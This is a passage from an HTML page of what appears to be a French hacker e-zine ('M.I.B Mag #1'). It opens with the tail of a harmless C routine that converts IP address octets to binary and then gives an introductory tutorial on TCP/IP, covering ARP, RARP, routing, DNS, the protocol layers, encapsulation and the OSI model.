	if (IP1>=128){nbre[0]=IP1 - 128; strcat(bin1,"1");;}
	if (IP1<=127){nbre[0]=IP1; strcat(bin1,"0");}
    if (nbre[0]>=64){nbre[1]=nbre[0] - 64; strcat(bin1,"1");}
    if (nbre[0]<=63){nbre[1]=nbre[0]; strcat(bin1,"0"); }
	if (nbre[1]>=32){nbre[2]=nbre[1] - 32; strcat(bin1,"1");}
    if (nbre[1]<=31){nbre[2]=nbre[1]; strcat(bin1,"0"); }
    if (nbre[2]>=16){nbre[3]=nbre[2] - 16; strcat(bin1,"1");}
    if (nbre[2]<=15){nbre[3]=nbre[2]; strcat(bin1,"0"); }
	if (nbre[3]>=8){nbre[4]=nbre[3] - 8; strcat(bin1,"1");}
    if (nbre[3]<=7){nbre[4]=nbre[3]; strcat(bin1,"0"); }
	if (nbre[4]>=4){nbre[5]=nbre[4] - 4; strcat(bin1,"1");}
    if (nbre[4]<=3){nbre[5]=nbre[4]; strcat(bin1,"0"); }
	if (nbre[5]>=2){nbre[6]=nbre[5] - 2; strcat(bin1,"1");}
    if (nbre[5]<=1){nbre[6]=nbre[5]; strcat(bin1,"0"); }
	if (nbre[6]>=1){strcat(bin1,"1");}
    if (nbre[6]<=0){strcat(bin1,"0"); }



  }



  void calcul2 ()

{


	if (IP2>=128){nbre[0]=IP2 - 128; strcat(bin2,"1");;}
	if (IP2<=127){nbre[0]=IP2; strcat(bin2,"0");}
    if (nbre[0]>=64){nbre[1]=nbre[0] - 64; strcat(bin2,"1");}
    if (nbre[0]<=63){nbre[1]=nbre[0]; strcat(bin2,"0"); }
	if (nbre[1]>=32){nbre[2]=nbre[1] - 32; strcat(bin2,"1");}
    if (nbre[1]<=31){nbre[2]=nbre[1]; strcat(bin2,"0"); }
    if (nbre[2]>=16){nbre[3]=nbre[2] - 16; strcat(bin2,"1");}
    if (nbre[2]<=15){nbre[3]=nbre[2]; strcat(bin2,"0"); }
	if (nbre[3]>=8){nbre[4]=nbre[3] - 8; strcat(bin2,"1");}
    if (nbre[3]<=7){nbre[4]=nbre[3]; strcat(bin2,"0"); }
	if (nbre[4]>=4){nbre[5]=nbre[4] - 4; strcat(bin2,"1");}
    if (nbre[4]<=3){nbre[5]=nbre[4]; strcat(bin2,"0"); }
	if (nbre[5]>=2){nbre[6]=nbre[5] - 2; strcat(bin2,"1");}
    if (nbre[5]<=1){nbre[6]=nbre[5]; strcat(bin2,"0"); }
	if (nbre[6]>=1){strcat(bin2,"1");}
    if (nbre[6]<=0){strcat(bin2,"0"); }



  }


  void calcul3 ()
{


	if (IP3>=128){nbre[0]=IP3 - 128; strcat(bin3,"1");;}
	if (IP3<=127){nbre[0]=IP3; strcat(bin3,"0");}
    if (nbre[0]>=64){nbre[1]=nbre[0] - 64; strcat(bin3,"1");}
    if (nbre[0]<=63){nbre[1]=nbre[0]; strcat(bin3,"0"); }
	if (nbre[1]>=32){nbre[2]=nbre[1] - 32; strcat(bin3,"1");}
    if (nbre[1]<=31){nbre[2]=nbre[1]; strcat(bin3,"0"); }
    if (nbre[2]>=16){nbre[3]=nbre[2] - 16; strcat(bin3,"1");}
    if (nbre[2]<=15){nbre[3]=nbre[2]; strcat(bin3,"0"); }
	if (nbre[3]>=8){nbre[4]=nbre[3] - 8; strcat(bin3,"1");}
    if (nbre[3]<=7){nbre[4]=nbre[3]; strcat(bin3,"0"); }
	if (nbre[4]>=4){nbre[5]=nbre[4] - 4; strcat(bin3,"1");}
    if (nbre[4]<=3){nbre[5]=nbre[4]; strcat(bin3,"0"); }
	if (nbre[5]>=2){nbre[6]=nbre[5] - 2; strcat(bin3,"1");}
    if (nbre[5]<=1){nbre[6]=nbre[5]; strcat(bin3,"0"); }
	if (nbre[6]>=1){strcat(bin3,"1");}
    if (nbre[6]<=0){strcat(bin3,"0"); }



  }


  void calcul4 ()
{


	if (IP4>=128){nbre[0]=IP4 - 128; strcat(bin4,"1");;}
	if (IP4<=127){nbre[0]=IP4; strcat(bin4,"0");}
    if (nbre[0]>=64){nbre[1]=nbre[0] - 64; strcat(bin4,"1");}
    if (nbre[0]<=63){nbre[1]=nbre[0]; strcat(bin4,"0"); }
	if (nbre[1]>=32){nbre[2]=nbre[1] - 32; strcat(bin4,"1");}
    if (nbre[1]<=31){nbre[2]=nbre[1]; strcat(bin4,"0"); }
    if (nbre[2]>=16){nbre[3]=nbre[2] - 16; strcat(bin4,"1");}
    if (nbre[2]<=15){nbre[3]=nbre[2]; strcat(bin4,"0"); }
	if (nbre[3]>=8){nbre[4]=nbre[3] - 8; strcat(bin4,"1");}
    if (nbre[3]<=7){nbre[4]=nbre[3]; strcat(bin4,"0"); }
	if (nbre[4]>=4){nbre[5]=nbre[4] - 4; strcat(bin4,"1");}
    if (nbre[4]<=3){nbre[5]=nbre[4]; strcat(bin4,"0"); }
	if (nbre[5]>=2){nbre[6]=nbre[5] - 2; strcat(bin4,"1");}
    if (nbre[5]<=1){nbre[6]=nbre[5]; strcat(bin4,"0"); }
	if (nbre[6]>=1){strcat(bin4,"1");}
    if (nbre[6]<=0){strcat(bin4,"0"); }



  }


/* Pour vider les "bin" de leurs précédentes valeurs */
void clean ()
{
	strcpy(bin1,"");
	strcpy(bin2,"");
	strcpy(bin3,"");
	strcpy(bin4,"");

}

</textarea>
  </div>
</form>
<blockquote> 
  <blockquote> 
    <p align="left"><font face="Times New Roman, Times, serif"><em><font color="#FFFFFF">6) 
      <u>Protocole de r&eacute;solution d'adresse (ARP)</u></font></em></font></p>
  </blockquote>
</blockquote>
<p align="left"><font color="#FFFFFF" face="Times New Roman, Times, serif">Comme 
  nous l'avons vu pr&eacute;cedemment, les machines d'un r&eacute;seau local utilisent 
  un protocole de la couche Internet, appel&eacute; <strong>ARP </strong>(<em><strong>A</strong>dresse 
  <strong>R</strong>esolution<strong> P</strong>rotocole)</em>, pour faire correspondre 
  les adresse IP aux adresse physiques. Afin de lui envoyer des donn&eacute;es, 
  une machine source doit connaitre l'adresse physique de la carte r&eacute;seau 
  de la machine de destination. C'est pour cela que ARP est un protocole tr&egrave;s 
  important.</font></p>
<p align="left"><font color="#FFFFFF" face="Times New Roman, Times, serif">Cha</font><font face="Times New Roman, Times, serif"><font color="#FFFFFF">que 
  machine du segment de r&eacute;seau doit maintenir en m&eacute;moire une table 
  appel&eacute;e </font><em><font color="#33CC99">table ARP</font></em><font color="#FFFFFF"> 
  ou</font> <em><font color="#33CC99">cache ARP</font></em>.<font color="#FFFFFF"> 
  Le cache ARP associe les adresses IP d'autres machines du segment &agrave; leurs 
  adresses physiques. Lorsqu'une machine a besoin d'envoyer des donn&eacute;es 
  &agrave; une autre machine du segment, elle v&eacute;rifie le segment le cahe 
  ARP afin de d&eacute;terminer l'adresse physique du destinataire. Si l'adresse 
  r&eacute;ceptrice des donn&eacute;es n'est pas dans le cache ARP, la machine 
  envoie un broadcast appel&eacute; </font><em><font color="#33CC99">trame de 
  requ&ecirc;te ARP</font></em><font color="#FFFFFF">.</font></font></p>
<p align="left"><font color="#FFFFFF" face="Times New Roman, Times, serif">La 
  trame de requ&ecirc;te ARP contient l'adresse IP non r&eacute;solue. Elle contient 
  &eacute;galement l'adresse IP et l'adresse physique de lam achine qui a envoy&eacute; 
  la requ&ecirc;te. Les autres machines du segment de r&eacute;seau re&ccedil;oivent 
  la requ&ecirc;te ARP et la machine dont l'adresse n'&eacute;tait pas r&eacute;solue 
  r&eacute;pond en retournant son adresse physique &agrave; celle qui a &eacute;mis 
  la requ&ecirc;te. Cette nouvelle correpondance adresse IP-adresse physique est 
  alors ajout&eacute;e au cache ARP de la machine ayant &eacute;mis la requ&ecirc;te.</font></p>
<p align="left">&nbsp;</p>
<blockquote> 
  <blockquote> 
    <p align="left"><font color="#FFFFFF" face="Times New Roman, Times, serif"><em>7) 
      <u>RARP</u></em></font></p>
  </blockquote>
</blockquote>
<p align="left"><strong><font color="#FFFFFF" face="Times New Roman, Times, serif">RARP 
  </font></strong><font color="#FFFFFF" face="Times New Roman, Times, serif">(<em><strong>R</strong>everse 
  <strong>ARP</strong></em>) fait le contraire de ARP. En effet ARP est utilis&eacute; 
  lorsque l'adresse IP est connue, mais pas l'adresse physique. RARP est utilis&eacute; 
  lorsque l'adresse physique est connue, mais pas l'adresse l'adressse IP.</font></p>
<p align="left">&nbsp;</p>
<p align="center"><font color="#FFFFFF" face="Times New Roman, Times, serif"><img src="M.I.B Mag #1_fichiers/Figure%205.JPG" width="566" height="431"></font></p>
<p align="center"><em><font color="#FFFFFF" face="Times New Roman, Times, serif">Figure 
  5 : ARP &eacute;tablit une correspondance entre les adresses IP et les adresses 
  physiques</font></em></p>
<p align="left">&nbsp;</p>
<blockquote> 
  <p align="left"><font color="#CCFFFF">B - <u>Routage</u></font></p>
</blockquote>
<p align="left"><font color="#FFFFFF">Un </font><em><font color="#33CC99">routeur</font> 
  </em><font color="#FFFFFF">est un dispositif particulier qui lit les adresses 
  logiques et oriente les donn&eacute;es &agrave; transmettre sur le r&eacute;seau 
  vers leur destinataire.</font></p>
<p align="left"><font color="#FFFFFF">Au niveau le plus bas, un routeur isole 
  un sous-r&eacute;seau local d'un grand r&eacute;seau (<em>voir Figure 3</em>).</font></p>
<p align="left"><font color="#FFFFFF">Les donn&eacute;es adress&eacute;es &agrave; 
  une autre machine ou &agrave; un autre &eacute;quipement du sous r&eacute;seau 
  local ne franchiront pas le routeur et n'encombreront pas les lignes de communication 
  du grand r&eacute;seau. Les donn&eacute;es destin&eacute;es &agrave; une machine 
  ext&eacute;rieure au r&eacute;seau local seront prises en charge par le routeur 
  qui les exp&eacute;diera &agrave; destination. Les tr&egrave;s grands r&eacute;seaux 
  tel Internet comprennent de nombreux routeurs qui fournissent des voies d'acheminement 
  multiples entre origine et destination.</font></p>
<p align="center"><img src="M.I.B Mag #1_fichiers/Figure%206.JPG" width="435" height="241"></p>
<p align="center"><em><font color="#FFFFFF">Figure 6 : un r&eacute;seau interconnect&eacute; 
  au moyen de routeurs</font></em></p>
<p align="center">&nbsp;</p>
<blockquote> 
  <p align="left"><font color="#CCFFFF">C - <u>R&eacute;solution d'adresses</u></font></p>
</blockquote>
<p align="left"><font color="#FFFFFF">Il peut-&ecirc;tre difficile de se rappeler 
  que l'adresse d'une machine est 113.102.114.163. TCP/IP offre parc consequent 
  une structure d'adressage en langage de tous les jours qui g&egrave;re des noms 
  de domaines : <strong>DNS</strong>, (<em><strong>D</strong>omain <strong>N</strong>ame 
  <strong>S</strong>ervice</em>, service de noms de domaines). La correspondance 
  entre adresse physique IP et nom de domaine est appel&eacute;</font> <font color="#33CC99"><em>r&eacute;solution 
  de noms de domaines<font color="#FFFFFF">, </font></em><font color="#FFFFFF">ou 
  plus simplement <font color="#33CC99"><em>r&eacute;solution d'adresses<font color="#FFFFFF">. 
  </font></em><font color="#FFFFFF">Des machines d&eacute;di&eacute;es, appel&eacute;es 
  <font color="#33CC99"> <em>serveur DNS</em><font color="#FFFFFF">, conservent 
  les tables de correspondances entre nom de domaine et adresse IP.</font></font></font></font></font></font></p>
<p align="left"><font color="#FFFFFF">Le service DNS de TCP/IP offre une hierarchie 
  de serveurs d'adresses qui fournissent une correspondance entre nom de domaine 
  et adresse physique IP pour les machines du r&eacute;seau enregistr&eacute;es 
  par DNS. Ainsi l'utilisateur n'a pas &agrave; conna&icirc;tre ou &agrave; d&eacute;chiffrer 
  les adresses IP.</font></p>
<p align="left">&nbsp;</p>
<font color="#FFFFFF"><param name="movie" value="text1.swf"> <param name="quality" value="high"> <param name="bgcolor" value="#000000"> <param name="scale" value="exactfit"> 
</font>
<blockquote> 
  <p><font color="#CCFFFF">D - <u>Contr&ocirc;le d'erreur et des flots de donn&eacute;es</u></font></p>
</blockquote>
<p><font color="#FFFFFF">La suite de protocole TCP/IP assure la fiabilit&eacute; 
  des donn&eacute;es transmises sur r&eacute;seau en contr&ocirc;lant les erreurs 
  de transmission &eacute;ventuelles et en &eacute;mettant des </font><font color="#33CC99"><em>accus&eacute;s 
  de r&eacute;ception </em><font color="#FFFFFF">qui confirme le succ&egrave;s 
  de l'op&eacute;ration. C'est la <font color="#FF9933">couche Transport <font color="#FFFFFF">de 
  TCP/IP qui g&egrave;re la plupart de ces contr&ocirc;les, les flots de donnn&eacute;es 
  et les accus&eacute;s de r&eacute;ception au sein du r&eacute;seau interconnect&eacute; 
  sous protocoles TCP. Des protocoles de plus bas niveau de la <font color="#FF9933">couche 
  Acc&egrave;s r&eacute;seau <font color="#FFFFFF">jouent aussi un r&ocirc;le 
  dans le processus global de contr&ocirc;le d'erreur.</font></font></font></font></font></font></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><u><strong>III. Le fonctionnement de TCP/IP</strong></u></font></p>
<blockquote> 
  <p><u><font color="#CCFFFF">A - Syst&egrave;me de protocoles TCP/IP</font></u></p>
  <blockquote>
    <p><em><font color="#FFFFFF">1) <u>Introduction</u></font></em></p>
  </blockquote>
</blockquote>
<p><font color="#FFFFFF">Un syst&egrave;me de protocoles de la dimension de TCP/IP 
  doit assurer les fonctions suivantes :</font></p>
<p><font color="#FFFFFF">.Fractionnement des messages en segments faciles &agrave; 
  mettre sur la ligne de communication</font></p>
<p><font color="#FFFFFF">.Interface avec la carte r&eacute;seau</font></p>
<p><font color="#FFFFFF">.Adressage : l'emetteur doit envoyer ses messages &agrave; 
  la bonne adresse. Le r&eacute;cepteur doit savoir d'o&ugrave; viennent les messages 
  qui le concernent</font></p>
<p><font color="#FFFFFF">Routage : le syst&egrave;me doit acheminer les donn&eacute;es 
  sur le sous-r&eacute;seau auquel appartient le destinataire, m&ecirc;me si ses 
  caract&eacute;ristiques physiques sont diff&eacute;rentes de celles du r&eacute;seau 
  auquel appartient l'emetteur</font></p>
<p><font color="#FFFFFF">.Contr&ocirc;le d'erreur : contr&ocirc;le des flots de 
  donn&eacute;es et acquittements. La fiabilit&eacute; de la liaison impose que 
  les partenaires soient capables d'identifier et de corriger les erreurs de transmission 
  ainisi que de contr&ocirc;ler le flot de donn&eacute;es</font></p>
<p><font color="#FFFFFF">.Transfert de donn&eacute;es d'une application au r&eacute;seau</font></p>
<p><font color="#FFFFFF">.R&eacute;ception des donn&eacute;es en provenance du 
  r&eacute;seau et transmission de celles-ci &agrave; l'application</font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF">Pour accomplir toutes ces fonctions, les cr&eacute;ateurs 
  de TCP/IP ont adopt&eacute; une approche <em>modulaire</em>, c'est &agrave; 
  dire que le syst&egrave;me de protocoles TCP/IP se d&eacute;compose en modules 
  qui fonctionnent en toutes ind&eacute;pendance. Chaque module est charg&eacute; 
  d'une t&acirc;che pr&eacute;cise dans le fonctionnement du processus de communication.</font></p>
<p><font color="#FFFFFF">Ceci permet aux fournisseurs tel que &quot;Microsoft&quot; 
  d'adapter les logiciels du protocole aux machines et syst&egrave;mes d'exploitation 
  qu'ils proposent. Autrement dit ils n'ont pas &agrave; cr&eacute;er deux logiciels 
  diff&eacute;rents pour les r&eacute;seaux TCP/IP en anneaux &agrave; jeton et 
  pour les r&eacute;seaux Ethernet TCP/IP par exemple(Je reviendrai plus loin 
  sur les diff&eacute;rentes formes des LAN). Dans ce cas pr&eacute;cis seul la 
  </font><font color="#FF9900">couche Acc&egrave;s r&eacute;seau</font> change 
  et pas les couches sup&eacute;rieures (Internet...)</p>
<p><font color="#FFFFFF">Depuis le d&eacute;but de cette introduction &agrave; 
  TCP/IP je parle de </font><font color="#FF9900"><em>couches<font color="#FFFFFF">, 
  </font></em><font color="#FFFFFF">mais quelles sont-elles exactement ?</font></font></p>
<p><font color="#FFFFFF">Et bien le syst&egrave;me de protocole TCP/IP est organis&eacute; 
  en couches dont chacune effectue des t&acirc;ches sp&eacute;cifiques, il faut 
  d'abord comprendre que le terme <em>couche </em>en informatique d&eacute;signe 
  les divers niveaux d'un protocole. Le mod&egrave;le ci-dessous est app&eacute;l&eacute; 
  : <em><font color="#33CC99">mod&egrave;le TCP/IP </font></em>ou <em><font color="#33CC99">pile 
  TCP/IP<font color="#FFFFFF"> :</font></font></em></font></p>
<p align="center"><em><font color="#FFFFFF"><img src="M.I.B Mag #1_fichiers/Figure%207.JPG" width="247" height="241"></font></em></p>
<p align="center"><em><font color="#FFFFFF">Figure 7 : les couches du mod&egrave;le 
  TCP/IP</font></em></p>
<p align="center">&nbsp;</p>
<blockquote> 
  <blockquote>
    <p align="left"><font color="#FFFFFF"><em>2) <u>Survol des couches</u></em></font></p>
  </blockquote>
</blockquote>
<p><font color="#FFFFFF"><em>Les couches du mod&egrave;le officiel de protocole 
  TCP/IP ont des r&ocirc;<strong>les </strong>multiples :</em></font></p>
<p align="left"><font color="#FFFFFF" size="5">.<font color="#FF9900"><strong><font size="3">Couche 
  Acc&egrave;s R&eacute;seau</font></strong></font><strong><font size="3"> :</font></strong></font></p>
<p align="left"><font color="#FFFFFF" size="3">Elle assure l'interface physique 
  avec le r&eacute;seau. Elle formate les donn&eacute;es aux normes du r&eacute;seau 
  et &eacute;labore les adresses de sous-r&eacute;seaux en tenant compte des adresses 
  physiques des machines destinataires. Elle effectue les contr&ocirc;les d'erreur 
  au niveau des donn&eacute;es mises sur le r&eacute;seau physique.</font></p>
<p align="left">&nbsp;</p>
<p align="left"><font color="#FFFFFF" size="5">.</font><font size="5"><strong><font color="#FF9900" size="3">Couche 
  Internet</font><font size="3"> : </font></strong></font></p>
<p align="left"><font color="#FFFFFF" size="3">Elle fournit un adressage logique, 
  ind&eacute;pendant du mat&eacute;riel, de fa&ccedil;on &agrave; faire transiter 
  des donn&eacute;es sur des r&eacute;seaux dont les architectures physiques sont 
  tr&egrave;s diverses. Cette couche met en place des routages qui temp&egrave;rent 
  le trafic et permettent l'acheminement de messages vers des r&eacute;seaux interconnect&eacute;s 
  (<em>internetworks</em>). Le terme <em>r&eacute;seaux interconnect&eacute;s 
  </em>d&eacute;signe un ensemble de r&eacute;seaux locaux (LAN) connect&eacute;s 
  entre eux, comme on peut trouver dans les grandes soci&eacute;t&eacute;sou sur 
  Internet. La couche Internet &eacute;tablit la correspondance entre adresse 
  physique et adresse logique.</font></p>
<p align="left">&nbsp;</p>
<p align="left"><font color="#FFFFFF" size="5">.</font><font size="5"><strong><font color="#FF9900" size="3">Couche 
  Transport</font><font size="3"> :</font></strong></font></p>
<p align="left"><font color="#FFFFFF" size="3">Elle assure le contr&ocirc;le des 
  flots de donn&eacute;es, les contr&ocirc;les d'erreurs et les accus&eacute;s 
  de r&eacute;ception sur les r&eacute;seaux interconnect&eacute;s. Elle sert 
  aussi d'interface pour les applications r&eacute;seau.</font></p>
<p align="left">&nbsp;</p>
<p align="left"><font color="#FFFFFF" size="5">.<strong><font color="#FF9900" size="3">Couche 
  Application</font><font size="3"> :</font></strong></font></p>
<p align="left"><font color="#FFFFFF" size="3">Elle offre des applications pour 
  le d&eacute;pannage r&eacute;seau, le transfert de fichiers et les besoins d'Internet. 
  Elle supporte aussi les API r&eacute;seau qui autorisent l'acc&egrave;s au r&eacute;seau 
  &agrave; des programmes &eacute;crits sous un syst&egrave;me d'exploitation 
  particulier.</font></p>
<p align="left">&nbsp;</p>
<blockquote> 
  <blockquote>
    <p align="left"><font color="#FFFFFF" size="3"><em>3) <u>L'encapsulation</u></em></font></p>
  </blockquote>
</blockquote>
<p align="left"><font color="#FFFFFF">Lorsque le syst&egrave;me de protocoles 
  TCP/IP traite un &eacute;l&eacute;ment de donn&eacute;e pour l'exp&eacute;dier 
  sur le r&eacute;seau, chaque couche de la machine exp&eacute;ditrice ajoute 
  une <em>couche d'information </em>&agrave; cet &eacute;l&eacute;ment &agrave; 
  l'attention de la couche correspondante de la machine r&eacute;ceptrice. Par 
  exemple , la couche Internet de l'ordinateur qui exp&eacute;die des donn&eacute;es 
  ajoute un en-t&ecirc;te contenant de l'information, laquelle sera exploit&eacute;e 
  au niveau de la couche Internet de la machine r&eacute;ceptrice. Ce processus 
  est appel&eacute; </font><em><font color="#33CC99">encapsulation<font color="#FFFFFF">. 
  </font></font></em><font color="#33CC99"><font color="#FFFFFF">A l'extr&eacute;mit&eacute; 
  r&eacute;ceptrice, ces en-t&ecirc;tes sont supprim&eacute;s d&egrave;s lors 
  que les donn&eacute;es traversent la pile de protocoles.</font></font> 
<p align="left"><font color="#FFFFFF">Il est important de m&eacute;moriser , en 
  ce qui concerne la pile de protocoles TCP/IP, que chaque couche joue un r&ocirc;le 
  dans le processus de comunication, en offrant les services requis &agrave; son 
  niveau. Lorsqu'une transmission est &eacute;tablie, elle descend l'empilement 
  des couches du mod&egrave;le, chacune des couches rajoute aux donn&eacute;es 
  un ensemble d'informations sp&eacute;cifiques appel&eacute; <em>en-t&ecirc;te</em></font>. 
  L'entit&eacute; qui se compose des donn&eacute;es et d'un en-t&ecirc;te devient 
  un ensemble de donn&eacute;es qui est &quot;repaquet&eacute;&quot; par l<font color="#FFFFFF">a 
  couche imm&eacute;diatement inf&eacute;rieure, avec adjonction d'un nouvel en-t&ecirc;te. 
  L'op&eacute;ration inverse est effectu&eacute;s lors de l'arriv&eacute;e du 
  message sur la machine r&eacute;ceptrice. Chaque couche analyse et reconstitue 
  ce qu'elle re&ccedil;oit jusqu'&agrave; restitution &agrave; l'&eacute;tat originel 
  des informations qui ont &eacute;t&eacute; exp&eacute;di&eacute;es. C'est un 
  peu le principe de la poup&eacute;e russe.</font></p>
<p align="left"><font color="#FFFFFF">A destination, la </font><font color="#FF9900">couche 
  Internet</font> <font color="#FFFFFF">exploite l'en-t&ecirc;te qui la concerne 
  puis l'&eacute;limine, la </font><font color="#FF9900">couche Transport</font><font color="#FFFFFF"> 
  fait de m&ecirc;me, et ainsi de suite. Une fois le dernier niveau franchi, seule 
  subsiste l'information dans son &eacute;tat originel. </font></p>
<p align="center"><img src="M.I.B Mag #1_fichiers/Figure%208.JPG" width="522" height="309"> </p>
<p align="center"><em><font color="#FFFFFF">Figure 8 : chaque couche ajoute son 
  en-t&ecirc;te aux donn&eacute;es</font></em></p>
<p align="left"><font color="#FFFFFF">Le paquetage des donn&eacute;es change donc 
  radicalement d'aspect &agrave; chaque travers&eacute;e de couche, d'o&ugrave; 
  des changements de noms... Voici la liste de ces applications, suivant les couches 
  travers&eacute;es :</font></p>
<p align="left"><font color="#FFFFFF">_Au niveau de la </font><font color="#FF9900">couche 
  Application</font><font color="#FFFFFF">, on parle de </font><font color="#33CC99"><em>message</em></font>.</p>
<p align="left"><font color="#FFFFFF">_Dans la </font><font color="#FF9900">couche 
  Transport</font><font color="#FFFFFF">, le message est encapsul&eacute; sous 
  la forme d'un </font><font color="#33CC99"><em>segment<font color="#FFFFFF"> 
  </font></em></font><font color="#FFFFFF">s'il s'agit de donn&eacute;es transmises 
  sous protocole </font><font color="#FF0000">TCP</font><font color="#FFFFFF">, 
  d'un</font> <font color="#33CC99"><em>datagramme</em></font> <font color="#FFFFFF">si 
  l'on est sous protocole </font><font color="#FF0000">UDP</font>.</p>
<p align="left"><font color="#FFFFFF">_La</font> <font color="#FF9900">couche 
  Internet</font><font color="#FFFFFF"> encapsule les segments de la </font><font color="#FF9900">couche 
  Transport</font><font color="#FFFFFF"> sous forme de</font> <em><font color="#33CC99">datagrammes</font></em>.</p>
<p align="left"><font color="#FFFFFF">_L'encapsulation, et parfois la framentation, 
  des datagrammes au niveau de la </font><font color="#FF9900">couche Acc&egrave;s 
  r&eacute;seau</font><font color="#FFFFFF"> produit des </font><font color="#33CC99"><em>trames</em></font><font color="#FFFFFF">. 
  Une trame devient un </font><font color="#33CC99"><em>train de bit</em></font><font color="#FFFFFF"> 
  dans la sous-couche de plus bas-niveau de la </font><font color="#FF9900">couche 
  Acc&egrave;s r&eacute;seau</font><font color="#FFFFFF">.</font></p>
<blockquote> 
  <p align="left">&nbsp;</p>
  <p align="left"><font color="#CCFFFF">B - <u>TCP/IP et le mod&egrave;le OSI</u></font></p>
</blockquote>
<p align="left"><font color="#FFFFFF">Le march&eacute; des r&eacute;seaux utilise 
  un mod&egrave;le standard &agrave; sept couches appel&eacute; <em>mod&egrave;le 
  <strong>OSI</strong> </em>( <em><strong>O</strong>pen <strong>S</strong>ystems<strong> 
  I</strong>nterconnections</em>) qui est apparue alors que le d&eacute;veloppement 
  de TCP/IP &eacute;tait en cours et qui a fortement influenc&eacute; le d&eacute;veloppement 
  des impl&eacute;mentations de protocoles. Le mod&egrave;le OSI est compos&eacute; 
  de 7 couches semblables &agrave; TCP/IP dans le sens o&ugrave; ce mod&egrave;le 
  r&eacute;partit les t&acirc;ches de la couche Application en trois couches (sous-couches) 
  : Application, Pr&eacute;sentation et Session. De plus OSI coupe la </font><font color="#FF9900">couche 
  Acc&egrave;s R&eacute;seau</font><font color="#FFFFFF"> de TCP/IP en deux couches 
  : la </font><font color="#FF9900">couche Liaison Donn&eacute;es</font><font color="#FFFFFF"> 
  et la </font><font color="#FF9900">couche Physique</font>. Cette organisation 
  complique un peu les chose mais les d&eacute;veloppeurs y gagnent en facilit&eacute; 
  d'adaptation de chacune de ces couches &agrave; leurs besoins sp&eacute;cifiques.</p>
<p align="center"><img src="M.I.B Mag #1_fichiers/Figure%209.JPG" width="470" height="446"></p>
<p align="center"><em><font color="#FFFFFF">Figure 9 : le mod&egrave;le &agrave; 
  7 couches d'OSI</font></em></p>
<p align="center">&nbsp;</p>
<p align="left"><font color="#FFFFFF">Les septs couches du mod&egrave;le OSI ont 
  les r&ocirc;les suivants : </font></p>
<p align="left"><font color="#FFFFFF" size="5"><strong>.</strong></font><strong><font size="5"><font color="#FF9900" size="3">Couche 
  physique <font color="#FFFFFF">: </font></font></font></strong><font size="5"><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  convertit les donn&eacute;es en signaux num&eacute;riques propres &agrave; transiter 
  sur le moyen de communication et g&egrave;re leur transmission.</font></font></font></p>
<p align="left"><strong><font color="#FFFFFF" size="5">.</font><font color="#FF9900" size="3">Couche 
  Liaison Donn&eacute;es <font color="#FFFFFF">: </font></font></strong><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  assure l'interface avec la carte r&eacute;seau, entretient les liens logiques 
  sur le sous-r&eacute;seau.</font></font></p>
<p align="left"><strong><font color="#FFFFFF" size="5">.</font><font color="#FF9900" size="3">Couche 
  R&eacute;seau <font color="#FFFFFF">: </font></font></strong><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  g&egrave;re l'adressage logique et le routage.</font></font></p>
<p align="left"><strong><font color="#FFFFFF" size="5">.</font><font color="#FF9900" size="3">Couche 
  Transport <font color="#FFFFFF">: </font></font></strong><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  contr&ocirc;le le flot des donn&eacute;es et g&egrave;re les erreurs.</font></font></p>
<p align="left"><strong><font color="#FFFFFF" size="5">.</font><font color="#FF9900" size="3">Couche 
  Session <font color="#FFFFFF"> : </font></font></strong><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  ouvre les sessions reliant les applications qui tournent sur les machines interconnect&eacute;es.</font></font></p>
<p align="left"><strong><font color="#FFFFFF" size="5">.</font><font color="#FF9900" size="3">Couche 
  Pr&eacute;sentation <font color="#FFFFFF">: </font></font></strong><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  met les donn&eacute;es au format standard, g&egrave;re le cryptage et la compression.</font></font></p>
<p align="left"><strong><font color="#FFFFFF" size="5">.</font><font color="#FF9900" size="3">Couche 
  Applicartion <font color="#FFFFFF">: </font></font></strong><font color="#FF9900" size="3"><font color="#FFFFFF">elle 
  assure l'interface entre les applications, g&egrave;re les transferts de fichiers, 
  les communications,etc.</font></font></p>
<p align="left">&nbsp;</p>
<blockquote> 
  <p align="left"><font color="#CCFFFF" size="3"><u>C - Rapide r&eacute;capitulatif 
    (sc&eacute;nario de base de l'envoie d'une trame sur un r&eacute;seau)</u></font></p>
</blockquote>
<p align="left"><font color="#FFFFFF" size="3">1. Les donn&eacute;es passent d'une 
  application TCP/IP issue d'une interface API <em>via </em>le port TCP ou UDP 
  vers l'un ou l'autre des protocoles Transport TCP ou UDP. </font></p>
<p align="left"><font color="#FFFFFF" size="3">2. Le segment de donn&eacute;es 
  passe dans la <font color="#FF9900">couche Internet<font color="#FFFFFF">, o&ugrave; 
  le protocole IP ajoute un datagramme avec des informations </font><font color="#FFFFFF" size="3"><font color="#FF9900"><font color="#FFFFFF">d'adressage 
  </font></font></font><font color="#FFFFFF">diverses.</font></font></font></p>
<p align="left"><font color="#FFFFFF" size="3">3. Le datagramme IP entre dans 
  la couche <font color="#FF9900">Acc&egrave;s r&eacute;seau <font color="#FFFFFF">pour 
  y &ecirc;tre trait&eacute; par les logiciels d'interface avec le r&eacute;seau 
  physique. <strong>ARP</strong> (<em><strong>A</strong>dress <strong>R</strong>esolution 
  <strong>P</strong>rotocol</em>) traduit les adresses IP en adresse physique, 
  tandis que<strong> RARP </strong>(<em><strong>R</strong>everse <strong>A</strong>ddress<strong> 
  R</strong>esolution <strong>P</strong>rotocol</em>) fait l'inverse.</font></font></font></p>
<p align="left"><font color="#FFFFFF" size="3">4.La trame de donn&eacute;es est 
  convertie en une cha&icirc;ne de bits confi&eacute;e au r&eacute;seau.</font></p>
<p align="left">&nbsp;</p>
<p align="left"><font color="#FFFFFF" size="3"><u><strong>IV. Conclusion</strong></u></font></p>
<p align="left"><font color="#FFFFFF">Et voil&agrave; c'est termin&eacute; pour 
  cette introduction &agrave; TCP/IP (1&egrave;re partie), j'esp&egrave;re avoir 
  &eacute;t&eacute; assez clair mais si quelque chose vous &eacute;chappe vous 
  pouvez toujours poser vos questions &agrave; <a href="mailto:%20mib@arenhack.com">MIB@ArenHack.com</a> 
